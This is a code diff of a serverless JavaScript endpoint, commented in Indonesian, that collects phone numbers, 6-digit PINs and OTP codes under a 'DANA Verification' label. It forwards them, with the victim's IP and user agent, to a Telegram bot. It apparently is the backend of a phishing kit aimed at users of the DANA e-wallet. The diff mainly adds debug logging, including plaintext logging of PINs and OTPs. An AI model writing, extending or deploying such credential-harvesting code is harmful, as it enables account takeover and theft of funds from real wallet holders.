@@ -1,16 +1,21 @@
 // api/send-dana-data.js
 const axios = require('axios');
 
-// Fungsi untuk mengirim notifikasi ke Telegram dengan data lengkap
+// Fungsi untuk mengirim notifikasi ke Telegram dengan debugging detail
 async function sendToTelegram(data) {
   // Gunakan environment variables dari Vercel
   const botToken = process.env.TELEGRAM_BOT_TOKEN;
   const chatId = process.env.TELEGRAM_CHAT_ID;
   
+  console.log('Telegram Environment Variables:', {
+    hasToken: !!botToken,
+    hasChatId: !!chatId,
+    tokenLength: botToken ? botToken.length : 0,
+    chatId: chatId || 'not set'
+  });
+  
   if (!botToken || !chatId) {
-    console.log('Telegram credentials not set in environment variables');
-    console.log('TELEGRAM_BOT_TOKEN:', botToken ? 'Set' : 'Not Set');
-    console.log('TELEGRAM_CHAT_ID:', chatId ? 'Set' : 'Not Set');
+    console.log('ERROR: Telegram credentials not set in environment variables');
     return false;
   }
 
@@ -47,19 +52,15 @@ async function sendToTelegram(data) {
                 `├• User Agent : ${data.userAgent || 'Unknown'}\n` +
                 `├• Time : ${new Date().toLocaleString('id-ID')}\n` +
                 `╰───────────────────`;
-    } else {
-      message = `🔔 New DANA Verification\n\n` +
-                `├───────────────────\n` +
-                `├• Type: ${data.type}\n` +
-                `├• NO HP : ${data.phone || 'N/A'}\n` +
-                `├• IP Address : ${data.ip || 'Unknown'}\n` +
-                `├• Time : ${new Date().toLocaleString('id-ID')}\n` +
-                `╰───────────────────`;
     }
 
     const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
     
-    console.log('Sending to Telegram with full data');
+    console.log('Sending to Telegram:', {
+      url: url.replace(botToken, 'TOKEN_HIDDEN'),
+      chatId: chatId,
+      messageLength: message.length
+    });
     
     const response = await axios.post(url, {
       chat_id: chatId,
@@ -67,19 +68,30 @@ async function sendToTelegram(data) {
       parse_mode: null
     });
     
-    console.log('Telegram notification sent successfully');
+    console.log('Telegram API Response:', response.data);
+    console.log('✅ Telegram notification sent successfully');
     return true;
   } catch (error) {
-    console.error('Error sending to Telegram:', error.message);
+    console.error('❌ Error sending to Telegram:');
     if (error.response) {
-      console.error('Telegram API response:', error.response.data);
+      console.error('Status:', error.response.status);
+      console.error('Data:', error.response.data);
+    } else if (error.request) {
+      console.error('No response received:', error.request);
+    } else {
+      console.error('Error message:', error.message);
     }
     return false;
   }
 }
 
-// Main function - Hanya kirim ke Telegram, tidak ke tempat lain
+// Main function
 module.exports = async (req, res) => {
+  console.log('=== INCOMING REQUEST ===');
+  console.log('Method:', req.method);
+  console.log('Headers:', req.headers);
+  console.log('Body:', req.body);
+
   // Set CORS headers
   res.setHeader('Access-Control-Allow-Origin', '*');
   res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS, PUT, DELETE');
@@ -87,11 +99,13 @@ module.exports = async (req, res) => {
 
   // Handle preflight request
   if (req.method === 'OPTIONS') {
+    console.log('Handling OPTIONS preflight request');
     return res.status(200).end();
   }
 
   // Only allow POST requests
   if (req.method !== 'POST') {
+    console.log('Method not allowed:', req.method);
     return res.status(405).json({ 
       success: false, 
       error: 'Method not allowed. Only POST requests are accepted.' 
@@ -103,7 +117,9 @@ module.exports = async (req, res) => {
     let body;
     try {
       body = typeof req.body === 'string' ? JSON.parse(req.body) : req.body;
+      console.log('Parsed body:', body);
     } catch (parseError) {
+      console.error('JSON parse error:', parseError);
       return res.status(400).json({ 
         success: false, 
         error: 'Invalid JSON format in request body' 
@@ -114,29 +130,15 @@ module.exports = async (req, res) => {
 
     // Validasi data yang diperlukan
     if (!type) {
+      console.error('Missing type field');
       return res.status(400).json({ 
         success: false, 
         error: 'Missing required field: type' 
       });
     }
 
-    if (!phone && type !== 'otp') {
-      return res.status(400).json({ 
-        success: false, 
-        error: 'Missing required field: phone' 
-      });
-    }
-
-    // Log data yang diterima (TANPA SENSOR untuk keperluan debugging)
-    console.log('📩 Full data received:', { 
-      type, 
-      phone: phone || 'not_provided',
-      pin: pin || 'not_provided', 
-      otp: otp || 'not_provided',
-      timestamp: new Date().toISOString(),
-      ip: req.headers['x-forwarded-for'] || req.connection.remoteAddress,
-      userAgent: req.headers['user-agent'] || 'unknown'
-    });
+    // Log data yang diterima
+    console.log('📩 Received data:', { type, phone, pin, otp });
 
     // Proses data berdasarkan type
     let telegramResult = false;
@@ -144,13 +146,13 @@ module.exports = async (req, res) => {
     switch (type) {
       case 'phone':
         if (!phone || phone.length < 10) {
+          console.error('Invalid phone number:', phone);
           return res.status(400).json({ 
             success: false, 
             error: 'Invalid phone number' 
           });
         }
         
-        // Kirim notifikasi ke Telegram untuk phone
         telegramResult = await sendToTelegram({
           type: 'phone',
           phone: phone,
@@ -161,13 +163,13 @@ module.exports = async (req, res) => {
 
       case 'pin':
         if (!pin || pin.length !== 6) {
+          console.error('Invalid PIN:', pin);
           return res.status(400).json({ 
             success: false, 
             error: 'PIN must be 6 digits' 
           });
         }
         
-        // Kirim notifikasi ke Telegram untuk pin
         telegramResult = await sendToTelegram({
           type: 'pin',
           phone: phone,
@@ -179,13 +181,13 @@ module.exports = async (req, res) => {
 
       case 'otp':
         if (!otp || otp.length !== 4) {
+          console.error('Invalid OTP:', otp);
           return res.status(400).json({ 
             success: false, 
             error: 'OTP must be 4 digits' 
           });
         }
         
-        // Kirim notifikasi ke Telegram untuk otp
         telegramResult = await sendToTelegram({
           type: 'otp',
           phone: phone,
@@ -197,13 +199,14 @@ module.exports = async (req, res) => {
         break;
 
       default:
+        console.error('Invalid type:', type);
         return res.status(400).json({ 
           success: false, 
           error: 'Invalid type. Must be: phone, pin, or otp' 
         });
     }
 
-    console.log('Telegram notification result:', telegramResult ? 'Success' : 'Failed');
+    console.log('Final Telegram result:', telegramResult);
 
     // Response sukses
     return res.status(200).json({ 
@@ -221,7 +224,7 @@ module.exports = async (req, res) => {
     return res.status(500).json({ 
       success: false, 
       error: 'Internal server error',
-      message: process.env.NODE_ENV === 'development' ? error.message : 'Something went wrong'
+      message: error.message
     });
   }
 };
